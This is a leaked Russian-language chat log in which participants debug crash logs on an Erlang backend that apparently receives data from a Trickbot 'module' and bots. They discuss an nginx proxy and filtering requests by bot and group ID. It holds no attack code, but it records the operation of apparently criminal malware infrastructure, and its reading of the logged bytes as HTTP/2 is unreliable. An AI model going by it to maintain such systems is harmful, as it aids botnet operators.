Timestamp	From	To	Message
2021-08-27 15:43:18.007 [info] <0.158.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,85,217,147,101,152,84,237,168,57,127,64,130,166,246,5,28,145,200,82,174,223,48,129,23,230,170,167,24,30,118,147,105,32,112,120,62,28,164,221,67,133,188,32,79,97,132,30,48,15,140,239,224,165,168,5,1,6,12,28,143,159,175,32,133,143,0,54,218,218,19,1,19,2,19,3,192,44,192,43,204,169,192,48,192,47,204,168,192,36,192,35,192,10,192,9,192,40,192,39,192,20,192,19,0,157,0,156,0,61,0,60,0,53,0,47,192,8,192,18,0,10,1,0,1,125,234,234,0,0,0,0,0,23,0,21,0,0,18,103,97,116,101,119,97,121,46,105,99,108,111,117,100,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,12,0,10,202,202,0,29,0,23,0,24,0,25,0,11,0,2,1,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,24,0,22,4,3,8,4,4,1,5,3,2,3,8,5,8,5,5,1,8,6,6,1,2,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,233,161,223,78,0,73,53,96,119,159,215,212,71,216,72,236,103,226,140,165,145,139,122,217,41,240,23,248,115,130,152,66,0,45,0,2,1,1,0,43,0,11,10,154,154,3,4,3,3,3,2,3,1,250,250,0,1,0,0,21,0,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,...>>
 State: {state,#Port<0.3896>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630068203006}
 ReqEmpty 0

проблемы не вызывает
2021-08-27 12:51:26.601977	ttrr	defender	или вот это:


2021-08-27 15:43:18.064 [info] <0.162.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,14,44,33,56,26,185,206,231,236,178,193,16,165,188,27,22,214,160,174,190,146,134,183,85,117,16,235,49,77,234,9,129,32,12,245,86,126,154,166,11,108,160,171,200,195,227,185,95,124,147,27,250,187,108,120,82,136,198,154,167,107,53,75,254,175,0,32,250,250,19,3,19,1,19,2,204,169,204,168,192,43,192,47,192,44,192,48,192,19,192,20,0,156,0,157,0,47,0,53,1,0,1,147,138,138,0,0,0,0,0,20,0,18,0,0,15,109,97,105,108,46,103,111,111,103,108,101,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,10,0,8,202,202,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,18,0,16,4,3,8,4,4,1,5,3,8,5,5,1,8,6,6,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,18,248,125,69,188,229,9,34,184,87,206,13,209,25,177,114,240,187,218,2,250,42,123,238,190,210,236,200,51,78,3,30,0,45,0,2,1,1,0,43,0,11,10,42,42,3,4,3,3,3,2,3,1,0,27,0,3,2,0,2,68,105,0,5,0,3,2,104,50,170,170,0,1,0,0,21,0,196,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0>>
2021-08-27 12:54:00.999784	ttrr	defender	@defender если очень надо то я могу перехватывать такой краш - и не показывать его.
2021-08-27 12:55:03.824419	ttrr	defender	ничего не понятно
2021-08-27 12:55:15.834419	ttrr	defender	как это соотносится с HTTP-запросом? какая это его часть?
2021-08-27 12:55:54.279610	ttrr	defender	это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?
2021-08-27 12:56:03.730621	ttrr	defender	или там вообще нет контейнера?
2021-08-27 12:57:49.426540	ttrr	defender	сними соответствующие HTTP-запросы, поставь прокси перед сервером
2021-08-27 13:02:26.806937	ttrr	defender	это самое начало
2021-08-27 13:02:41.481437	ttrr	defender	вот как идет поток .. вот так и логирует
2021-08-27 13:03:07.916328	ttrr	defender	тебе в текстовом виде ? так там миллион управляющих символов каких-то
2021-08-27 13:03:14.345891	ttrr	defender	где то в середине http/1.1
2021-08-27 13:03:17.205940	ttrr	defender	виднеется
2021-08-27 13:03:42.549146	ttrr	defender	можно файлом
2021-08-27 13:04:01.501144	ttrr	defender	ты можешь локализовать сбойный байт?
2021-08-27 13:04:01.818049	ttrr	defender	ок щас сделаю
2021-08-27 13:04:07.445592	ttrr	defender	даже хотя бы в этом потоке
2021-08-27 13:04:18.872657	ttrr	defender	сказать - байт номер такой-то приводит к вылету
2021-08-27 13:05:55.255286	ttrr	defender	он говорит что метода нет в хттп
2021-08-27 13:06:01.244955	ttrr	defender	cowboy_protocol:parse_method(<<>>
2021-08-27 13:06:06.853843	ttrr	defender	пустой - поток обрывается
2021-08-27 13:08:00.858677	ttrr	defender	наверно пришло время обновить либу .. а то она уже далеко вперед ушла
2021-08-27 13:09:11.123290	ttrr	defender	либа 6 летней давности
2021-08-27 13:09:39.656671	ttrr	defender	протокол не сильно менялся за эти 6 лет
2021-08-27 13:11:32.565984	ttrr	defender	я бы сказал не менялся )
2021-08-27 13:12:55.664397	ttrr	defender	куда файл закинуть ?
2021-08-27 13:16:15.449823	ttrr	defender	https://disk.yandex.ru/d/zIsWj8NjR53tGg
2021-08-27 13:16:18.194368	ttrr	defender	вот 2 файла
2021-08-27 13:17:30.254981	defender	ttrr	flip и steller отправил приглашения
2021-08-27 13:17:30.259202	ttrr	defender	flip и steller отправил приглашения
2021-08-27 13:18:23.928260	ttrr	defender	мне все равно пока ничего не ясно из файлов
2021-08-27 13:18:59.120232	ttrr	defender	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:21:57.110895	ttrr	defender	это бинарный поток который мне приходит ..
2021-08-27 13:22:00.247259	ttrr	defender	вот с первого байта
2021-08-27 13:22:25.679374	defender	ttrr	давайте поставлю nginx между клиентом и деро
2021-08-27 13:22:25.680102	ttrr	defender	давайте поставлю nginx между клиентом и деро
2021-08-27 13:22:31.475508	ttrr	defender	поставь
2021-08-27 13:22:37.699623	defender	ttrr	и там может по логам что поймем
2021-08-27 13:22:37.700712	ttrr	defender	и там может по логам что поймем
2021-08-27 13:22:37.843365	ttrr	defender	и пусть логирует все запросы ..
2021-08-27 13:22:46.281848	defender	ttrr	ок сейчас
2021-08-27 13:22:46.283346	ttrr	defender	ок сейчас
2021-08-27 13:22:53.638295	ttrr	defender	запрос . тело . ответ
2021-08-27 13:23:09.180599	defender	ttrr	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:23:09.181748	ttrr	defender	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:24:01.558723	defender	ttrr	а, драйвера не добавил сюда
2021-08-27 13:24:01.561955	ttrr	defender	а, драйвера не добавил сюда
2021-08-27 13:24:08.080018	defender	ttrr	нужен он?
2021-08-27 13:24:08.081160	ttrr	defender	нужен он?
2021-08-27 13:24:55.921814	ttrr	defender	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:25:13.261384	ttrr	defender	вот кто это генерит - тот и нужен ..
2021-08-27 13:28:48.362135	ttrr	defender	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:28:57.837676	ttrr	defender	и нужно указание - что в нем криво
2021-08-27 13:34:50.153327	ttrr	defender	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:39:46.751134	ttrr	defender	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:40:50.330075	ttrr	defender	подождем что дефендер скажет
2021-08-27 13:49:10.567103	ttrr	defender	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:18.704093	ttrr	defender	их много
2021-08-27 13:49:49.131892	ttrr	defender	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:50:18.925809	ttrr	defender	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:53:32.720403	ttrr	defender	и расчитывать на то, что данные будут невалидные
2021-08-27 13:54:01.212062	ttrr	defender	их могут специально посылать
2021-08-27 13:58:05.090629	ttrr	defender	ну я либу могу модифицировать . просто чтобы если экзепшн в какой-то области .. то в лог не падало и даже ответ можно слать я думаю
2021-08-27 13:58:24.129330	ttrr	defender	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:26.262568	ttrr	defender	точнее без них
2021-08-27 13:58:29.820643	ttrr	defender	а там бинарный поток
2021-08-27 13:58:48.997612	ttrr	defender	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:59:02.545630	ttrr	defender	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:21.605171	ttrr	defender	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:40.081867	ttrr	defender	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 14:04:43.777776	defender	ttrr	нет
2021-08-27 14:04:43.781555	ttrr	defender	нет
2021-08-27 14:04:57.487562	defender	ttrr	прокладки - роутеры, что приняли то и передали
2021-08-27 14:04:57.490592	ttrr	defender	прокладки - роутеры, что приняли то и передали
2021-08-27 14:07:15.102362	ttrr	defender	отлучился
2021-08-27 14:09:00.007991	ttrr	defender	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:10.161578	ttrr	defender	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:16.333361	ttrr	defender	нужно подтверждение от тебя
2021-08-27 14:13:25.740431	defender	ttrr	я делаю нджинкс
2021-08-27 14:13:25.744339	ttrr	defender	я делаю нджинкс
2021-08-27 14:15:45.064081	ttrr	defender	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:51.254888	ttrr	defender	вот тот бинарный
2021-08-27 14:53:54.440158	ttrr	defender	что значит послать до базы ?
2021-08-27 14:53:58.872672	ttrr	defender	@buza
2021-08-27 14:54:32.240124	ttrr	defender	не послать, а проследить
2021-08-27 14:54:40.783813	ttrr	defender	вот тебе пришел этот бинарный запрос
2021-08-27 14:54:51.037887	ttrr	defender	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 14:55:04.012285	ttrr	defender	раз так, он должен положить в базу данных новую запись
2021-08-27 14:55:10.354057	ttrr	defender	эту запись можно увидеть?
2021-08-27 14:55:14.254929	ttrr	defender	там больше нет ничего ..
2021-08-27 14:55:22.132717	ttrr	defender	ну т.е. до базы оно не доходит
2021-08-27 14:55:28.795988	ttrr	defender	ни первый ни второй?
2021-08-27 14:55:31.161839	ttrr	defender	просто в логи ничего не пишется
2021-08-27 14:55:37.826701	ttrr	defender	да
2021-08-27 14:55:50.742802	ttrr	defender	ну так может это и не мы?
2021-08-27 14:55:50.932836	ttrr	defender	может это боты поисковые и т.п ?
2021-08-27 14:56:35.198744	ttrr	defender	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 14:56:48.978670	ttrr	defender	все HTTP/2 QUIC и прочий модный кал
2021-08-27 14:57:01.398854	ttrr	defender	и запретить доступ к веб-серверу не с прокладки
2021-08-27 15:28:09.447955	defender	ttrr	нет не могу
2021-08-27 15:28:09.450800	ttrr	defender	нет не могу
2021-08-27 15:28:22.260957	defender	ttrr	говорю же там все как есть передает
2021-08-27 15:28:22.262595	ttrr	defender	говорю же там все как есть передает
2021-08-27 16:18:03.233020	defender	ttrr	сделал через нджинкс
2021-08-27 16:18:03.240793	ttrr	defender	сделал через нджинкс
2021-08-27 16:18:09.346196	defender	ttrr	но пока логирование обычное
2021-08-27 16:18:09.347314	ttrr	defender	но пока логирование обычное
2021-08-27 16:18:28.783542	defender	ttrr	углубленное позже сделаю
2021-08-27 16:18:28.784797	ttrr	defender	углубленное позже сделаю
2021-08-30 06:48:14.631226	ttrr	defender	@defender -- так всё вопрос закрыт ?
2021-08-30 08:19:29.155750	ttrr	defender	defender: а почему не могу?
https://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx
я вот так имею в виду - тут пишут что "могу"
2021-08-30 08:43:21.004389	ttrr	defender	zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика
2021-08-30 08:44:15.468860	ttrr	defender	ну вообще не были . они были отброшены т.к. не распаршены . ну и очевидно что хттп2 .а не хттп1
2021-08-30 08:44:17.032729	ttrr	defender	нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво
2021-08-30 08:44:38.452457	ttrr	defender	для начала давайте отфильтруем внешние запросы .
2021-08-30 08:44:47.715819	ttrr	defender	я думаю проблема сама собой решится .
2021-08-30 08:45:02.141509	ttrr	defender	потому что не может один и тот же модуль\код выдавать 2 разных протокола .
2021-08-30 08:45:02.583443	ttrr	defender	zulas: поясни мне проблему с крешем
2021-08-30 08:45:07.250818	ttrr	defender	почему это проблема?
2021-08-30 08:45:17.028383	ttrr	defender	потому что сервис падает и передача данных кончается?
2021-08-30 08:45:18.247973	ttrr	defender	я хз почему это проблема .. это к дефу
2021-08-30 08:45:29.888588	ttrr	defender	потому что в логи краши срет .. и всё
2021-08-30 08:45:37.390706	ttrr	defender	сервис остается жив?
2021-08-30 08:45:40.578338	ttrr	defender	слушает дальше?
2021-08-30 08:45:41.779297	ttrr	defender	конечно
2021-08-30 08:45:46.969645	ttrr	defender	твою бать
2021-08-30 08:45:52.600530	ttrr	defender	тогда хули мы тут обсуждаем?
2021-08-30 08:46:00.270855	ttrr	defender	я хз . я это сразу говорил
2021-08-30 08:46:23.872957	ttrr	defender	Краш означает что пришло нечто и оно не попало в базу.
2021-08-30 08:46:41.499030	ttrr	defender	Т.к. не распозналось либой эрланга, верно?
2021-08-30 08:47:00.263056	ttrr	defender	нечто - это что угодно, собственно я и сказал что это что угодно, а нормальный POST оно распознает . и обработвает
2021-08-30 08:47:01.979538	ttrr	defender	значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов
2021-08-30 08:47:43.835662	ttrr	defender	[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\
2021-08-30 08:47:53.820536	ttrr	defender	сосредоточтесь на этом
2021-08-30 08:48:14.365972	ttrr	defender	zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1
2021-08-30 08:48:24.784725	ttrr	defender	и давайте разбирать нормальный пример
2021-08-30 08:48:31.337947	ttrr	defender	значит для начала нужно обеспечить условия, чтобы только модуль трика мог ко мне данные передавать . иначе мы говорим о любом боте который шлет любое говно
2021-08-30 08:49:09.766393	ttrr	defender	деф что-то отрежет, но не думаю что всё
2021-08-30 08:49:25.628100	ttrr	defender	по хттп1 тебе все равно будут лезть левые спайдеры
2021-08-30 08:51:43.324141	ttrr	defender	Есть вариант передать любым способом ключ в бота, и сделать на эрланге проверку, что ключ в запросе совпадает с ключем в базе
2021-08-30 08:52:06.213552	ttrr	defender	чтобы что?
2021-08-30 08:52:29.669862	ttrr	defender	отсечь все данные которые не относятся к трику.
2021-08-30 08:52:52.947880	ttrr	defender	вообще-то у бэка есть штатный механизм для этого
2021-08-30 08:53:08.920700	ttrr	defender	он парсит запрос и вытаскивает ID бота из него
2021-08-30 08:53:35.692466	ttrr	defender	это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы
2021-08-30 08:53:48.794475	ttrr	defender	остальные 9% левых запросов отсечется по неправдоподобному ИД бота
2021-08-30 08:53:54.542484	ttrr	defender	но можно и падать
2021-08-30 08:56:42.266440	ttrr	defender	падает потому что ему протокол непонятен - он ожидает одно, а нихера не приходит .
2021-08-30 08:57:05.200728	ttrr	defender	когда протокол понятен - то и соответствущя реакция на него независимо правильный он ( от нас) или не правильны (от чужих)
2021-08-30 08:57:35.264247	ttrr	defender	вот когда отсечет .. тогда можно говорить о чем . а если падает только на левых ..
2021-08-30 09:00:25.677237	ttrr	defender	еще раз, какую проблему мы решаем?
2021-08-30 09:03:21.874652	ttrr	defender	то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно
2021-08-30 09:03:46.740987	ttrr	defender	я пока вижу левые данные только
2021-08-30 09:03:53.975851	ttrr	defender	driver: ?
2021-08-30 09:10:20.685161	ttrr	defender	Вообще про краши говорил дэф.
2021-08-30 09:10:34.434680	ttrr	defender	Я думаю что нам надо закрыть логи
2021-08-30 09:11:15.487643	ttrr	defender	Чтобы можно было понять что приходит на бэк. Чтобы если краши появляются можно было понять что именно причина
2021-08-30 09:11:29.532138	ttrr	defender	У нас есть поток тестовых данных которые всегда ошибки вызывают.
2021-08-30 09:13:13.917392	ttrr	defender	Например я часто вычищаю из базы какие то записи которые явно не в тему. Их там 6 штук по кукам, но они все время появляются и дальше никогда не проходят
2021-08-30 09:14:09.942008	ttrr	defender	То что сейчас сделали с нджинксом - задачу решает пока что.
Надо только более полные логи настроить
2021-08-30 09:14:23.957903	ttrr	defender	Чтобы тело пост запросов можно было видеть.
2021-08-30 09:16:17.561310	ttrr	defender	ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?
2021-08-30 09:21:45.711674	ttrr	defender	Да
2021-08-30 09:21:52.695193	ttrr	defender	Сейчас это главное.
2021-08-30 09:24:33.033068	ttrr	defender	Вся история про эту конфу была с сообщения что нужно менять либу парсинга чтобы логи сделать, о чем нам зулас сообщил, но дэф придумал просто поставить проксю нджинкс. Так что я честно не очень понимаю, каких то правок пока нет больше в бэке.
Но есть проблема, что часть данных не приходит и вот нужно понять почему и тогда дальше думать.
2021-08-30 09:26:50.169628	ttrr	defender	логи сделаны .. я приводил выдержки оттуда
2021-08-30 09:27:47.882728	ttrr	defender	для меня непонятно кто это генерит .. но факт в том что либа не может понять что это ... поэтому краши .. 
хттп1 она обрабатыват .. хттп2 у нас нет .. соотвественно давайте хттп2 просто закроем и всё
2021-08-30 09:27:59.129723	ttrr	defender	тогда мы сузим круг возможных проблем и найдем решение для них
2021-08-30 09:28:46.216278	ttrr	defender	краши по факту могут быть всегда -- всмысли когда какой-то левый протокол на порт коннектится .. то может быть краш в лог . это не значит что сервис в дауне . это просто значит что один именно этот запрос не вызвал нужной реакции сервера
2021-08-30 09:36:07.626417	ttrr	defender	> соотвественно давайте хттп2 просто закроем и всё 
точнее закроем все что не хттп1
2021-08-30 09:36:26.647234	ttrr	defender	я не думаю что у Nginx проблемы могут быть с такой логикой .. правильно ?
